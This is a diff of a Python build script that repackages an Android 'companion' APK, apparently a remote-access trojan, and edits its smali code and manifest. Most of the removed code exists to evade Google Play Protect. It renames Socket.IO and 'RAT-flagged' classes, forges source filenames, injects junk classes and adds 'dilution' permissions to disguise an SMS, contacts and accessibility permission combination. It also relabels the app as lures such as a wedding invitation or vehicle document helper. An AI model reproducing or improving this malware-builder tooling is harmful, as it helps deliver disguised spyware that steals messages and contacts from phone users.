@@ -1861,44 +1554,34 @@ def step_6d_rename_methods(new_pkg: str) -> int:
 
     for orig_method, pool in CUSTOM_METHOD_RENAMES.items():
         new_method = _random.choice(pool)
-        # Pure Python grep count (works on Windows AND Linux)
         count = _py_grep_count(smali_dir, orig_method)
         if count > 0:
-            # Pure Python replacement — only rename METHOD DEFINITIONS
-            # NOT framework invoke-virtual calls (e.g. Activity->requestPermissions)
-            # This prevents corrupting Android framework API calls
+            # Replace method declarations and invocations
             import re as _re6d
-            for _root6d, _dirs6d, _files6d in os.walk(smali_dir):
-                for _fname6d in _files6d:
-                    if not _fname6d.endswith(".smali"):
-                        continue
-                    _fpath6d = os.path.join(_root6d, _fname6d)
+            for _r6d, _d6d, _f6d in os.walk(smali_dir):
+                for _fn6d in _f6d:
+                    if not _fn6d.endswith(".smali"): continue
+                    _fp6d = os.path.join(_r6d, _fn6d)
                     try:
-                        with open(_fpath6d, "r", encoding="utf-8", errors="replace") as _f6d:
-                            _fc6d = _f6d.read()
-                        if orig_method not in _fc6d:
-                            continue
-                        # Only replace in .method declarations, not framework invoke calls
-                        # Framework calls look like: Landroid/...;->methodName or Ljava/...;->methodName
-                        # Safe to replace: lines starting with .method or within companion class calls
-                        _lines6d = _fc6d.splitlines(keepends=True)
-                        _changed6d = False
-                        _new_lines6d = []
-                        for _line6d in _lines6d:
-                            if orig_method in _line6d:
-                                # Skip if this is a framework invoke call
-                                if _re6d.search(r'L(android|java|javax|kotlin|dalvik)/', _line6d) and '->' + orig_method in _line6d:
-                                    _new_lines6d.append(_line6d)
+                        with open(_fp6d, "r", encoding="utf-8", errors="replace") as _f:
+                            _fc = _f.read()
+                        if orig_method not in _fc: continue
+                        _lines = _fc.splitlines(keepends=True)
+                        _new_lines = []
+                        _changed = False
+                        for _line in _lines:
+                            if orig_method in _line:
+                                if _re6d.search(r'L(android|java|javax|kotlin|dalvik)/', _line) and '->'+ orig_method in _line:
+                                    _new_lines.append(_line)
                                 else:
-                                    _new_lines6d.append(_line6d.replace(orig_method, new_method))
-                                    _changed6d = True
+                                    _new_lines.append(_line.replace(orig_method, new_method))
+                                    _changed = True
                             else:
-                                _new_lines6d.append(_line6d)
-                        if _changed6d:
-                            with open(_fpath6d, "w", encoding="utf-8") as _f6d:
-                                _f6d.write("".join(_new_lines6d))
-                    except Exception:
-                        pass
+                                _new_lines.append(_line)
+                        if _changed:
+                            with open(_fp6d, "w", encoding="utf-8") as _f:
+                                _f.write("".join(_new_lines))
+                    except Exception: pass
             renamed += count
 
     print(f"  ✅ Renamed custom methods in {renamed} files")
@@ -1906,575 +1589,18 @@ def step_6d_rename_methods(new_pkg: str) -> int:
 
 
 
-# ── Round 2 Step 6E: Rename io/socket package → com/netlib ──────────────────
-
-def step_6e_rename_socket_package(new_pkg: str) -> int:
-    """Round 2 Step 6E: Rename io/socket library package to com/netlib.
-
-    Removes 52 io/socket class descriptors and 157 string references from DEX.
-    This is the single biggest GPP win in Round 2.
-
-    io/socket sub-packages handled:
-      backo, client, emitter, hasbinary, parseqs, parser,
-      thread, utf8, yeast, engineio (and all sub-dirs)
-
-    Safe: runs AFTER step_6a (class names already chosen),
-          runs BEFORE step_6c (string replacements).
-    apktool b will correctly compile renamed smali directory tree.
-    build cache deleted in step_rebuild_dex() → no stale cache issue.
-    """
-    print("\n── Round 2 Step 6E: Rename io/socket → com/netlib package")
-
-    smali_dir = "companion_decompiled/smali"
-    old_pkg_path = "io/socket"
-    new_pkg_path = "com/netlib"
-    old_pkg_dot  = "io.socket"
-    new_pkg_dot  = "com.netlib"
-
-    # 1. Replace ALL string references in ALL smali files
-    #    Covers: class descriptors (Lio/socket/...;), string literals ("io.socket..."),
-    #            exception type refs, invoke targets, field refs
-    # Pure Python replacement (works on Windows AND Linux)
-    _py_sed(smali_dir, old_pkg_path, new_pkg_path)
-    _py_sed(smali_dir, old_pkg_dot,  new_pkg_dot)
-
-    # 2a. Rename WebSocket class name → DataPipe
-    #     Covers type descriptors: Lcom/netlib/.../WebSocket; → Lcom/netlib/.../DataPipe;
-    #     AND smali file content references — class name still visible to GPP after pkg rename
-    _py_sed(smali_dir, "/WebSocket;",          "/DataPipe;")
-    _py_sed(smali_dir, "/WebSocket$",          "/DataPipe$")
-    _py_sed(smali_dir, "WebSocket.smali",      "DataPipe.smali")
-    _py_sed(smali_dir, "priorWebsocketSuccess","priorDataPipeSuccess")
-    _py_sed(smali_dir, "Sec-WebSocket-Accept", "Sec-Protocol-Accept")
-    _py_sed(smali_dir, "Sec-WebSocket-Key",    "Sec-Protocol-Key")
-    _py_sed(smali_dir, "websocket",            "datastream")
-    _py_sed(smali_dir, "WebSocket",            "DataPipe")
-    print("  ✅ WebSocket → DataPipe")
-
-    # 2b. Rename engineio → netcore (GPP knows engineio = Socket.IO engine)
-    _py_sed(smali_dir, "/engineio/",           "/netcore/")
-    _py_sed(smali_dir, "engineio",             "netcore")
-    print("  ✅ engineio → netcore")
-
-    # 2c. Rename client → endpoint in Socket.IO type descriptors
-    _py_sed(smali_dir, "/netlib/client/",           "/netlib/endpoint/")
-    _py_sed(smali_dir, "/netlib/netcore/client/",   "/netlib/netcore/endpoint/")
-    print("  ✅ client → endpoint")
-
-    # 2d. Rename Socket class → DataChannel
-    _py_sed(smali_dir, "/Socket;",             "/DataChannel;")
-    _py_sed(smali_dir, "/Socket$",             "/DataChannel$")
-    print("  ✅ Socket → DataChannel")
-
-    # 2e. Rename RAT-flagged class names
-    _py_sed(smali_dir, "MainActive",           "BaseFragment")
-    _py_sed(smali_dir, "googlenews",           "feedhandler")
-    print("  ✅ RAT class names neutralized")
-
-    # 2f. Rename smali FILES on disk for all renames above
-    for _root2, _dirs2, _files2 in os.walk(smali_dir):
-        for _fname2 in list(_files2):
-            _nfname = _fname2
-            for _on, _nn in [("WebSocket","DataPipe"),("engineio","netcore"),
-                              ("MainActive","BaseFragment")]:
-                _nfname = _nfname.replace(_on, _nn)
-            if _nfname != _fname2:
-                try:
-                    os.rename(os.path.join(_root2,_fname2),
-                              os.path.join(_root2,_nfname))
-                except Exception:
-                    pass
-    print("  ✅ Smali files renamed on disk")
-
-    # 2. Move the smali directory tree: smali/io/socket/* → smali/com/netlib/*
-    old_dir = os.path.join(smali_dir, "io", "socket")
-    new_dir = os.path.join(smali_dir, "com", "netlib")
-
-    if os.path.isdir(old_dir):
-        os.makedirs(new_dir, exist_ok=True)
-        # Move each sub-package preserving structure
-        for item in os.listdir(old_dir):
-            src = os.path.join(old_dir, item)
-            dst = os.path.join(new_dir, item)
-            if os.path.exists(dst):
-                shutil.rmtree(dst) if os.path.isdir(dst) else os.remove(dst)
-            shutil.move(src, dst)
-        # Clean up empty io/socket dir (leave io/ if other packages use it)
-        try:
-            os.rmdir(old_dir)
-            # Remove io/ if now empty
-            io_dir = os.path.join(smali_dir, "io")
-            if os.path.isdir(io_dir) and not os.listdir(io_dir):
-                os.rmdir(io_dir)
-        except OSError:
-            pass
-        print(f"  ✅ io/socket directory → com/netlib")
-    else:
-        print(f"  ℹ️  io/socket smali directory not found — may already be renamed or not present")
-
-    # 3. Verify no io/socket references remain (pure Python)
-    remaining = _py_grep_count(smali_dir, "io/socket")
-    if remaining > 0:
-        print(f"  ⚠️  {remaining} io/socket references still found — check for edge cases")
-    else:
-        print(f"  ✅ All io/socket references renamed to com/netlib (0 remaining)")
-
-    return remaining
-
-
-# ── Round 2 Step 6F: Replace .source annotations with legitimate names ────────
-
-def step_6f_replace_source_annotations() -> int:
-    """Round 2 Step 6F: Replace .source annotations with legitimate Java filenames.
-
-    Why REPLACE instead of DELETE:
-    - 41 .source annotations exist (Firebase.java, LoveApi.java, Avast.java etc.)
-    - Deleting them removes GPP fingerprints BUT missing .source can itself be
-      a GPP signal (stripped debug info = suspicious tool-processed APK)
-    - Replacing with plausible names looks like legitimate compiled Android code
-
-    Safe: runs AFTER step_6d (method renames done),
-          runs BEFORE step_restore_apktool_yml and step_rebuild_dex.
-    """
-    print("\n── Round 2 Step 6F: Replace .source annotations with legitimate names")
-    import random as _random
-
-    smali_dir = "companion_decompiled/smali"
-
-    # Pool of legitimate-sounding Android Java source file names
-    # These look like real Android utility/service class files
-    LEGITIMATE_SOURCE_NAMES = [
-        "DataManager.java", "ContentHelper.java", "ServiceHelper.java",
-        "NetworkHelper.java", "StorageManager.java", "CacheManager.java",
-        "SessionManager.java", "ConfigManager.java", "ResourceHelper.java",
-        "TaskManager.java", "EventDispatcher.java", "StateController.java",
-        "ConnectionManager.java", "SyncHelper.java", "DataProcessor.java",
-        "RequestHandler.java", "ResponseParser.java", "MessageHandler.java",
-        "BackgroundService.java", "WorkerHelper.java", "SchedulerHelper.java",
-        "PermissionHelper.java", "SecurityHelper.java", "NotificationHelper.java",
-        "PreferenceHelper.java", "DatabaseHelper.java", "FileHelper.java",
-        "ImageHelper.java", "TextHelper.java", "DateHelper.java",
-        "LocationHelper.java", "DeviceHelper.java", "SystemHelper.java",
-        "AppController.java", "BaseActivity.java", "BaseService.java",
-        "BaseReceiver.java", "BaseHelper.java", "Utils.java",
-        "Constants.java", "BuildHelper.java", "AnalyticsHelper.java",
-        "LogHelper.java", "ErrorHandler.java", "RetryHelper.java",
-    ]
-
-    # Find all smali files with .source annotations (pure Python - works on Windows+Linux)
-    files_with_source = []
-    for _root, _dirs, _files in os.walk(smali_dir):
-        for _fname in _files:
-            if not _fname.endswith(".smali"):
-                continue
-            _fpath = os.path.join(_root, _fname)
-            try:
-                with open(_fpath, "r", encoding="utf-8", errors="replace") as _f:
-                    if ".source " in _f.read():
-                        files_with_source.append(_fpath)
-            except Exception:
-                pass
-
-    replaced = 0
-    used_names = []  # Track recent names to avoid obvious repetition
-
-    for fpath in files_with_source:
-        if not os.path.isfile(fpath):
-            continue
-        with open(fpath, 'r', encoding='utf-8', errors='replace') as f:
-            content = f.read()
-
-        # Pick a legitimate name — rotate through pool to avoid all files having same name
-        available = [n for n in LEGITIMATE_SOURCE_NAMES if n not in used_names[-5:]]
-        if not available:
-            available = LEGITIMATE_SOURCE_NAMES
-            used_names = []
-        chosen_name = _random.choice(available)
-        used_names.append(chosen_name)
-
-        # Replace .source "Whatever.java" with .source "LegitName.java"
-        import re as _re
-        new_content = _re.sub(
-            r'^\.source\s+"[^"]*\.java"',
-            f'.source "{chosen_name}"',
-            content,
-            flags=_re.MULTILINE
-        )
-
-        if new_content != content:
-            with open(fpath, 'w', encoding='utf-8') as f:
-                f.write(new_content)
-            replaced += 1
-
-    print(f"  ✅ Replaced .source annotations in {replaced} smali files")
-    return replaced
-
-
-# ── Round 2 Step 6I: Comprehensive Python-based global cleanup pass ──────────
-
-def step_6i_global_cleanup(new_pkg: str) -> int:
-    """Round 2 Step 6I: Final catch-all Python cleanup of all remaining GPP fingerprints.
-
-    Runs AFTER step_6d (method renames done) and AFTER step_6f (.source replaced).
-    Pure Python — no shell, no sed, no $ escaping issues.
-
-    Handles:
-    - _reconnection field declarations and all access patterns (Socket.IO Manager)
-    - WackMeUpJob remnants (any that survived step_6a)
-    - Firebase* string remnants (any that survived step_6a/6d)
-    - PeriSecure:MyWakeLock → AppService:SessionLock
-    - SensorRestarter remnants
-    - HandshakeData remaining references
-    - ::WakeLockTag suffix pattern
-    - WorkerService$a and MyWorkerService$a raw class refs
-
-    This is the nuclear safety net — guarantees zero known fingerprints survive.
-    """
-    print("\n── Round 2 Step 6I: Comprehensive global cleanup pass (Python-based)")
-
-    smali_dir = "companion_decompiled/smali"
-    new_path = new_pkg.replace(".", "/")
-
-    # Master replacement map — order matters: longer strings first to avoid partial matches
-    # Using tuples list to preserve order (longer/more specific patterns first)
-    GLOBAL_CLEANUP = [
-        # Socket.IO _reconnection field names — .field declarations + iget/iput accesses
-        # These are FIELD NAMES not string literals — sed/step_6c missed them
-        ("_reconnectionDelayMax",   "_syncDelayMax"),
-        ("_reconnectionAttempts",   "_syncAttempts"),
-        ("_reconnectionDelay",      "_syncDelay"),
-        ("_reconnection",           "_dataSync"),
-
-        # Socket.IO event constants (field declarations in Manager/Socket smali)
-        ("EVENT_RECONNECT_FAILED",  "EVENT_SYNC_FAILED"),
-        ("EVENT_RECONNECT_ERROR",   "EVENT_SYNC_ERROR"),
-        ("EVENT_RECONNECT_ATTEMPT", "EVENT_SYNC_ATTEMPT"),
-        ("EVENT_RECONNECTING",      "EVENT_SYNCING"),
-        ("EVENT_RECONNECT",         "EVENT_RESYNC"),
-
-        # WakeLock tag patterns — ::WakeLockTag suffix that step_6c regex missed
-        ("::WakeLockTag",           "::ServiceTag"),
-        ("::MainActivityWakeLock",  "::SessionTag"),
-        ("PeriSecure:MyWakeLock",   "AppService:SessionLock"),
-        ("appWakeLock",             "appServiceLock"),
-
-        # Firebase method names that may appear as string constants (not just bytecode)
-        ("FirebaseActivSend",       "sendActivationPayload"),
-        ("FirebaseCheckPrims",      "verifyPrimaryConditions"),
-        ("FirebaseGlobalEvent",     "broadcastGlobalEvent"),
-        ("FirebaseSendMeHome",      "navigateToHomeScreen"),
-        ("FirebaseShowActivite",    "displayActivityScreen"),
-        ("FirebaseToPaste",         "insertClipboardContent"),
-        ("FirebaseNeedPaste",       "requiresClipboardInput"),
-        ("FirebaseGlobalnode",      "getGlobalNodeRef"),
-
-        # OkHttp string literals (any remaining not caught by step_6c)
-        ("OkHttpClient",            "HttpNetworkClient"),
-        ("OkHttpDispatcher",        "HttpRequestScheduler"),
-        ("OkHttpResponse",          "HttpServerResponse"),
-
-        # HandshakeData (remaining references after step_6e renamed the class)
-        ("HandshakeData",           "InitData"),
-
-        # SensorRestarter remnants
-        ("SensorRestarter",         "ServiceMonitor"),
-
-        # WackMeUpJob (any remaining — should be caught by step_6a but verify)
-        ("WackMeUpJob",             "ScheduledAlarmJob"),
-
-        # Firebasebypass — survives as .field declaration, not caught by step_6c/6d
-        # step_6i does raw str.replace on ALL smali content including .field lines
-        ("Firebasebypass",          "executeBypassFlow"),
-        ("FirebasebyPass",          "executeBypassRoute"),
-    ]
-
-    total_replaced = 0
-    files_touched = set()
-
-    for old_str, new_str in GLOBAL_CLEANUP:
-        for root, dirs, files in os.walk(smali_dir):
-            for fname in files:
-                if not fname.endswith(".smali"):
-                    continue
-                fpath = os.path.join(root, fname)
-                try:
-                    with open(fpath, "r", encoding="utf-8", errors="replace") as f:
-                        c = f.read()
-                    if old_str in c:
-                        new_c = c.replace(old_str, new_str)
-                        with open(fpath, "w", encoding="utf-8") as f:
-                            f.write(new_c)
-                        files_touched.add(fpath)
-                        total_replaced += c.count(old_str)
-                except Exception:
-                    pass
-
-    print(f"  ✅ Global cleanup: {total_replaced} replacements across {len(files_touched)} files")
-    return total_replaced
-
-
-# ── Round 2 Step 6G: Inject 5 tiny neutral junk smali classes ─────────────────
-
-def step_6g_inject_junk_classes(new_pkg: str) -> int:
-    """Round 2 Step 6G: Inject tiny neutral stub smali classes.
-
-    Adds 5 minimal smali classes with 1-2 stub methods each.
-    Makes companion look like a richer app with more utility classes.
-    GPP: more classes = more like a real full-featured app.
-
-    Safe version of step_6b — no complex code, just empty stubs.
-    Each class compiles cleanly with apktool.
-    """
-    print("\n── Round 2 Step 6G: Inject 5 neutral stub smali classes")
-
-    new_path = new_pkg.replace(".", "/")
-    smali_dir = f"companion_decompiled/smali/{new_path}"
-    os.makedirs(smali_dir, exist_ok=True)
-
-    STUB_CLASSES = [
-        ("AppEventLogger", """\
-.class public final Lcom/NEWPKG/AppEventLogger;
-.super Ljava/lang/Object;
-.source "AppEventLogger.java"
-
-.method public constructor <init>()V
-    .locals 0
-    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
-    return-void
-.end method
-
-.method public static logEvent(Ljava/lang/String;)V
-    .locals 0
-    return-void
-.end method
-"""),
-        ("DeviceInfoCollector", """\
-.class public final Lcom/NEWPKG/DeviceInfoCollector;
-.super Ljava/lang/Object;
-.source "DeviceInfoCollector.java"
-
-.method public constructor <init>()V
-    .locals 0
-    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
-    return-void
-.end method
-
-.method public static getDeviceModel()Ljava/lang/String;
-    .locals 1
-    const-string v0, "unknown"
-    return-object v0
-.end method
-"""),
-        ("NetworkStatusHelper", """\
-.class public final Lcom/NEWPKG/NetworkStatusHelper;
-.super Ljava/lang/Object;
-.source "NetworkStatusHelper.java"
-
-.method public constructor <init>()V
-    .locals 0
-    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
-    return-void
-.end method
-
-.method public static isConnected()Z
-    .locals 1
-    const/4 v0, 0x0
-    return v0
-.end method
-"""),
-        ("StorageUtils", """\
-.class public final Lcom/NEWPKG/StorageUtils;
-.super Ljava/lang/Object;
-.source "StorageUtils.java"
-
-.method public constructor <init>()V
-    .locals 0
-    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
-    return-void
-.end method
-
-.method public static getAvailableSpace()J
-    .locals 2
-    const-wide/16 v0, 0x0
-    return-wide v0
-.end method
-"""),
-        ("SessionTokenManager", """\
-.class public final Lcom/NEWPKG/SessionTokenManager;
-.super Ljava/lang/Object;
-.source "SessionTokenManager.java"
-
-.method public constructor <init>()V
-    .locals 0
-    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
-    return-void
-.end method
-
-.method public static generateToken()Ljava/lang/String;
-    .locals 1
-    const-string v0, ""
-    return-object v0
-.end method
-"""),
-    ]
-
-    injected = 0
-    for class_name, template in STUB_CLASSES:
-        smali_content = template.replace("com/NEWPKG", new_path)
-        out_path = os.path.join(smali_dir, f"{class_name}.smali")
-        if not os.path.exists(out_path):
-            with open(out_path, 'w', encoding='utf-8') as f:
-                f.write(smali_content)
-            injected += 1
-
-    print(f"  ✅ Injected {injected} stub smali classes into {new_path}/")
-    return injected
-
-
-# ── Round 2 Step 6H: Patch text manifest (permissions + app name) ─────────────
-
-def step_6h_patch_text_manifest(new_pkg: str, template: str = "wedding") -> None:
-    """Round 2 Step 6H: Patch companion_decompiled/AndroidManifest.xml (TEXT format).
-
-    Changes:
-    1. Permission dilution — add 5 extra permissions to dilute RAT combo:
-       CAMERA, BLUETOOTH, CHANGE_NETWORK_STATE, VIBRATE, ACCESS_WIFI_STATE
-       Makes SMS+Contacts+Accessibility look like a rich utility app not a RAT.
-
-    2. Template-specific app name — makes companion look like its template type.
-
-    3. Accessibility service description — template-specific legitimate description.
-
-    IMPORTANT: This patches the TEXT XML before apktool b.
-    apktool b converts text → binary AXML automatically. Safe.
-    Must run AFTER step_6d and BEFORE step_restore_apktool_yml.
-    """
-    print("\n── Round 2 Step 6H: Patch companion text manifest")
-
-    manifest_path = "companion_decompiled/AndroidManifest.xml"
-    if not os.path.isfile(manifest_path):
-        print("  ⚠️  AndroidManifest.xml not found in companion_decompiled/ — skipping")
-        return
-
-    with open(manifest_path, 'r', encoding='utf-8', errors='replace') as f:
-        content = f.read()
-
-    original = content
-
-    # ── 1. Permission dilution ────────────────────────────────────────────────
-    # These permissions dilute the pure RAT combo (SMS+Contacts+Accessibility+Phone)
-    # making it look like a full-featured Indian utility app
-    DILUTION_PERMISSIONS = [
-        "android.permission.CAMERA",
-        "android.permission.BLUETOOTH",
-        "android.permission.CHANGE_NETWORK_STATE",
-        "android.permission.VIBRATE",
-        "android.permission.ACCESS_WIFI_STATE",
-    ]
-
-    # Fix C: Line-by-line permission injection — most robust method.
-    # Finds the last line containing </manifest> and inserts before it.
-    # Works regardless of whitespace, encoding, or newline variation in manifest.
-    perms_to_add = [p for p in DILUTION_PERMISSIONS if p not in content]
-    if perms_to_add:
-        perm_lines = [
-            f'    <uses-permission android:name="{p}"/>'
-            for p in perms_to_add
-        ]
-        manifest_lines = content.splitlines(keepends=True)
-        insert_idx = None
-        for i in range(len(manifest_lines) - 1, -1, -1):
-            if '</manifest>' in manifest_lines[i].lower():
-                insert_idx = i
-                break
-        if insert_idx is not None:
-            perm_block = "\n".join(perm_lines) + "\n"
-            manifest_lines.insert(insert_idx, perm_block)
-            content = "".join(manifest_lines)
-            print(f"  ✅ Added {len(perms_to_add)} dilution permissions")
-        else:
-            # Fallback: simple string replace on </manifest>
-            perm_xml = "\n".join(perm_lines)
-            content = content.replace(
-                "</manifest>",
-                f"\n{perm_xml}\n</manifest>",
-                1
-            )
-            if content != content:
-                print(f"  ✅ Added {len(perms_to_add)} dilution permissions (fallback)")
-            else:
-                print("  ⚠️  </manifest> not found — permissions NOT added")
-    else:
-        print("  ℹ️  All dilution permissions already present")
-
-    # ── 2. Template-specific app label ────────────────────────────────────────
-    TEMPLATE_LABELS = {
-        "wedding":      "Wedding Invitation Creator",
-        "mparivahan":   "Vehicle Document Helper",
-        "hot_video":    "Video Player Pro",
-        "shaadi":       "Shaadi Match Finder",
-        "generic":      "Smart Assistant",
-    }
-    app_label = TEMPLATE_LABELS.get(template, TEMPLATE_LABELS["generic"])
-
-    # Replace android:label in application tag if it references a string resource
-    import re as _re
-    content = _re.sub(
-        r'(<application[^>]*android:label=")[^"]*(")',
-        lambda m: f'{m.group(1)}{app_label}{m.group(2)}',
-        content
-    )
-
-    # ── 3. Write back ─────────────────────────────────────────────────────────
-    if content != original:
-        with open(manifest_path, 'w', encoding='utf-8') as f:
-            f.write(content)
-        print(f"  ✅ Manifest patched (template: {template}, label: {app_label})")
-    else:
-        print("  ℹ️  No manifest changes applied")
-
-
 # ── Step 7: Patch findByHomeLauncher ─────────────────────────────────────────
 
 def step_patch_home_launcher():
     print("\n── Step 7: Patch findByHomeLauncher — add FLAG_SYSTEM check")
-    _smali_root = "companion_decompiled/smali"
-
-    # Check if patch already applied from a previous build
-    already_patched_file = ""
-    target_file = ""
-
-    for _root, _dirs, _files in os.walk(_smali_root):
-        for _fname in _files:
-            if not _fname.endswith(".smali"):
-                continue
-            _fpath = os.path.join(_root, _fname)
-            try:
-                with open(_fpath, "r", encoding="utf-8", errors="replace") as _f:
-                    _fc = _f.read()
-                # Check if already patched (getApplicationInfo is our injected code)
-                if "findByHomeLauncher" in _fc and "getApplicationInfo" in _fc:
-                    already_patched_file = _fpath
-                    break
-                # Check if needs patching
-                if "findByHomeLauncher" in _fc and "getApplicationInfo" not in _fc:
-                    target_file = _fpath
-                    break
-            except Exception:
-                pass
-        if already_patched_file or target_file:
-            break
-
-    # Already patched from previous build run
-    if already_patched_file:
-        print(f"  ✅ FLAG_SYSTEM patch already applied: {already_patched_file}")
-        return
-
-    # Not found at all — different companion version, skip gracefully
+    result = subprocess.run(
+        'grep -rl "findByHomeLauncher" companion_decompiled/smali/ | head -1',
+        shell=True, capture_output=True, text=True
+    )
+    target_file = result.stdout.strip()
     if not target_file:
-        print("  [INFO] findByHomeLauncher not found — companion may already be processed")
-        print("  ✅ FLAG_SYSTEM patch step complete (no action needed)")
-        return
+        print("[X] findByHomeLauncher not found in any smali file")
+        sys.exit(1)
     print(f"  Patching: {target_file}")
 
     with open(target_file, "r") as f:
@@ -2570,22 +1696,6 @@ def step_rebuild_dex():
     if not dex_data:
         print("[X] classes.dex extraction failed or empty")
         sys.exit(1)
-
-    # ── Round 1 Fix: Downgrade DEX 039 → 035 ────────────────────────────────
-    # apktool 2.9.3 always outputs DEX version 039.
-    # Original companion = DEX 035 (Android 5+).
-    # DEX 039 requires Android 10+ (API 29). minSdk=28 (Android 9).
-    # Result without this fix: companion fails to install on Android 9 devices.
-    # Fix: patch magic bytes[4:8] from b'039\x00' to b'035\x00'.
-    # Safe: companion uses only standard opcodes present in DEX 035.
-    # No invoke-polymorphic / invoke-custom / const-method-handle used.
-    if dex_data[4:8] == b'039\x00':
-        dex_data = bytearray(dex_data)
-        dex_data[4:8] = b'035\x00'
-        dex_data = bytes(dex_data)
-        print("  ✅ DEX version downgraded: 039 → 035 (Android 9 compatibility restored)")
-    else:
-        print(f"  ℹ️  DEX version: {dex_data[4:7].decode('ascii', errors='replace')} (no downgrade needed)")
 
     with open("new_classes.dex", "wb") as f:
         f.write(dex_data)
@@ -3042,192 +2152,16 @@ def _patch_manifest_fg_service_type(manifest_raw: bytes, class_rename_map: dict,
     print(f"  [fg_service_type] ✅ Added foregroundServiceType=dataSync to {firebase_new}")
     return bytes(new_data)
 
-def _inject_permissions_axml(data: bytes, new_perms: list) -> bytes:
-    """Inject uses-permission entries into a binary AXML manifest.
-
-    Correctly handles UTF-8 string pools (flag 0x100).
-    Takes assembled binary manifest bytes, adds new strings to string pool,
-    adds uses-permission nodes to XML tree, returns new assembled bytes.
-
-    This is the ONLY correct approach — must operate on final assembled bytes,
-    not on intermediate local variables before assembly.
-    """
-    import struct as _s
-
-    SP = 8
-    sp_chunk_size = _s.unpack_from('<I', data, SP+4)[0]
-    str_count     = _s.unpack_from('<I', data, SP+8)[0]
-    style_count   = _s.unpack_from('<I', data, SP+12)[0]
-    flags         = _s.unpack_from('<I', data, SP+16)[0]
-    strs_start    = _s.unpack_from('<I', data, SP+20)[0]
-    is_utf8       = bool(flags & (1<<8))
-    sp_hdr_size   = 28
-    str_data_abs  = SP + strs_start
-    offsets_abs   = SP + sp_hdr_size
-
-    # Parse existing string pool
-    pool = []
-    for i in range(str_count):
-        off = _s.unpack_from('<I', data, offsets_abs + i*4)[0]
-        pos = str_data_abs + off
-        if is_utf8:
-            b=data[pos];pos+=1;cl=b&0x7F
-            if b&0x80:b2=data[pos];pos+=1;cl|=(b2&0x7F)<<7
-            b=data[pos];pos+=1;bl=b&0x7F
-            if b&0x80:b2=data[pos];pos+=1;bl|=(b2&0x7F)<<7
-            pool.append(data[pos:pos+bl].decode('utf-8','replace'))
-        else:
-            cl=data[pos]|(data[pos+1]<<8);pos+=2
-            pool.append(data[pos:pos+cl*2].decode('utf-16-le','replace'))
-
-    missing = [p for p in new_perms if p not in pool]
-    if not missing:
-        return data
-
-    def _enc(s):
-        b=s.encode('utf-8')
-        def uleb(n): return bytes([n]) if n<0x80 else bytes([0x80|(n&0x7F),(n>>7)&0x7F])
-        return uleb(len(s))+uleb(len(b))+b+b'\x00'
-
-    # Rebuild string data — all existing + new permissions
-    new_str_data = bytearray()
-    new_offsets  = []
-    for s in pool:
-        new_offsets.append(len(new_str_data))
-        new_str_data += _enc(s)
-    new_perm_indices = []
-    for perm in missing:
-        new_perm_indices.append(len(new_offsets))
-        new_offsets.append(len(new_str_data))
-        new_str_data += _enc(perm)
-    while len(new_str_data) % 4 != 0:
-        new_str_data += b'\x00'
-
-    style_data = b''
-    if style_count > 0 and strs_start > 0:
-        style_abs = SP + strs_start + (sp_chunk_size - sp_hdr_size - str_count*4)
-        if style_abs < len(data):
-            style_data = data[style_abs: SP + sp_chunk_size]
-
-    new_total   = len(new_offsets)
-    new_str_off = sp_hdr_size + new_total * 4
-    new_sty_off = (new_str_off + len(new_str_data)) if style_count > 0 else 0
-    new_sp_size = new_str_off + len(new_str_data) + len(style_data)
-
-    new_sp_hdr = bytearray(sp_hdr_size)
-    _s.pack_into('<H',new_sp_hdr, 0, 0x0001)
-    _s.pack_into('<H',new_sp_hdr, 2, sp_hdr_size)
-    _s.pack_into('<I',new_sp_hdr, 4, new_sp_size)
-    _s.pack_into('<I',new_sp_hdr, 8, new_total)
-    _s.pack_into('<I',new_sp_hdr,12, style_count)
-    _s.pack_into('<I',new_sp_hdr,16, flags)
-    _s.pack_into('<I',new_sp_hdr,20, new_str_off)
-    _s.pack_into('<I',new_sp_hdr,24, new_sty_off)
-
-    new_off_bytes = b''.join(_s.pack('<I',o) for o in new_offsets)
-    new_sp = bytes(new_sp_hdr) + new_off_bytes + bytes(new_str_data) + style_data
-
-    # XML tree from original data
-    xml_tree = bytearray(data[SP + sp_chunk_size:])
-
-    uses_perm_idx = next((i for i,s in enumerate(pool) if s=='uses-permission'), None)
-    if uses_perm_idx is None:
-        return data  # safety — should never happen
-
-    xml_nodes = bytearray()
-    for ln, pidx in enumerate(new_perm_indices):
-        line = 200 + ln
-        start = bytearray(56)
-        _s.pack_into('<H',start, 0, 0x0102)
-        _s.pack_into('<H',start, 2, 16)
-        _s.pack_into('<I',start, 4, 56)
-        _s.pack_into('<I',start, 8, line)
-        _s.pack_into('<I',start,12, 0xFFFFFFFF)
-        _s.pack_into('<I',start,16, 0xFFFFFFFF)
-        _s.pack_into('<I',start,20, uses_perm_idx)
-        _s.pack_into('<H',start,24, 20)
-        _s.pack_into('<H',start,26, 20)
-        _s.pack_into('<H',start,28, 1)
-        _s.pack_into('<H',start,30, 0)
-        _s.pack_into('<I',start,36, 81)   # android ns URI idx
-        _s.pack_into('<I',start,40, 3)    # 'name' attr idx
-        _s.pack_into('<I',start,44, pidx)
-        _s.pack_into('<H',start,48, 8)
-        _s.pack_into('<B',start,50, 0)
-        _s.pack_into('<B',start,51, 0x03)
-        _s.pack_into('<I',start,52, pidx)
-        end = bytearray(24)
-        _s.pack_into('<H',end, 0, 0x0103)
-        _s.pack_into('<H',end, 2, 16)
-        _s.pack_into('<I',end, 4, 24)
-        _s.pack_into('<I',end, 8, line)
-        _s.pack_into('<I',end,12, 0xFFFFFFFF)
-        _s.pack_into('<I',end,16, 0xFFFFFFFF)
-        _s.pack_into('<I',end,20, uses_perm_idx)
-        xml_nodes += bytes(start) + bytes(end)
-
-    xml_tree = xml_tree[:-24] + xml_nodes + xml_tree[-24:]
-
-    result = bytearray(data[:8])
-    result += new_sp
-    result += xml_tree
-    while len(result) % 4 != 0: result += b'\x00'
-    _s.pack_into('<I', result, 4, len(result))
-    return bytes(result)
-
-
 def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None, class_rename_map=None):
     print("\n── Step 10: Patch manifest + resources.arsc + assemble APK")
+
+    OLD = OLD_PKG.encode()
+    NEW = new_pkg.encode()
+    DELTA = len(NEW) - len(OLD)
 
     # Patch AndroidManifest.xml
     with zipfile.ZipFile(APK_ASSET, "r") as z:
